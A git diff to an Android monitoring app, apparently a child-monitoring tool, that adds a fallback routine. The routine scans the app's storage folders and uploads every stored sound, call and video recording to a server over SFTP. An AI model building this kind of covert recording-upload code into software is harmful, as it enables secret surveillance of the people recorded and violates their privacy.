@@ -4,13 +4,14 @@ import android.app.IntentService;
 import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.os.Environment;
 
+import com.byteshaft.kidmonitor.AppGlobals;
+import com.byteshaft.kidmonitor.constants.AppConstants;
 import com.byteshaft.kidmonitor.database.MonitorDatabase;
 import com.byteshaft.kidmonitor.utils.Helpers;
 import com.byteshaft.kidmonitor.utils.SftpHelpers;
 import com.byteshaft.kidmonitor.utils.WebServiceHelpers;
-import com.jcraft.jsch.JSchException;
-import com.jcraft.jsch.SftpException;
 
 import org.json.JSONException;
 
@@ -61,14 +62,18 @@ public class UploadService extends IntentService {
                 } else {
                     String uri = map.get("uri").toString();
                     File file = new File(uri);
-                    if (!file.exists()) {
-                        return;
-                    }
-                    System.out.println("To upload: " + uri);
-                    SftpHelpers.upload(type, uri, Integer.valueOf(map.get("unique_id").toString()));
-                }
+                    if (file.exists()) {
+                        SftpHelpers.upload(type, uri, Integer.valueOf(map.get("unique_id").toString()));
+                    } else {
+                        MonitorDatabase database = new MonitorDatabase(getApplicationContext());
+                        database.deleteEntry(Integer.valueOf(map.get("unique_id").toString()));
 
+                    }
+
+                }
             }
+            // forced upload if database is not working or corrupted by any reason
+            getFilesIfExistAndUpload();
         }
         mDatabase.close();
     }
@@ -98,4 +103,49 @@ public class UploadService extends IntentService {
         }
         return success;
     }
+
+    public static void getFilesIfExistAndUpload() {
+        String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
+        String dataDirectory = sdcard + "/Android/data/";
+        String storageDirectory = dataDirectory + AppGlobals.getContext().
+                getPackageName() + File.separator;
+        File filePath = new File(storageDirectory);
+        File[] files = filePath.listFiles();
+        ArrayList<String> arrayList = new ArrayList<>();
+        if (files == null) {
+            return;
+        } else if (files.length >= 0) {
+            for (File file : files) {
+                arrayList.add(file.toString());
+            }
+
+            if (!arrayList.isEmpty() && arrayList.size() >= 0) {
+                for (String path : arrayList) {
+                    File folderPath = new File(path);
+                    File[] dataInsideFolder = folderPath.listFiles();
+                    if (dataInsideFolder == null || dataInsideFolder.length == 0) {
+
+                    } else if (folderPath.exists()) {
+                        for (File data : dataInsideFolder) {
+                            String currentFolder = folderPath.toString();
+                            SftpHelpers.upload(getCurrentFolder(currentFolder), data.toString(), -1);
+                        }
+
+                    }
+                }
+            }
+
+        }
+    }
+
+    private static String getCurrentFolder(String folder) {
+        if (folder.endsWith(AppConstants.TYPE_SOUND_RECORDINGS)) {
+            return AppConstants.TYPE_SOUND_RECORDINGS;
+        } else if (folder.endsWith(AppConstants.TYPE_CALL_RECORDINGS)) {
+            return AppConstants.TYPE_CALL_RECORDINGS;
+        } else {
+            return AppConstants.TYPE_VIDEO_RECORDINGS;
+        }
+    }
+
 }
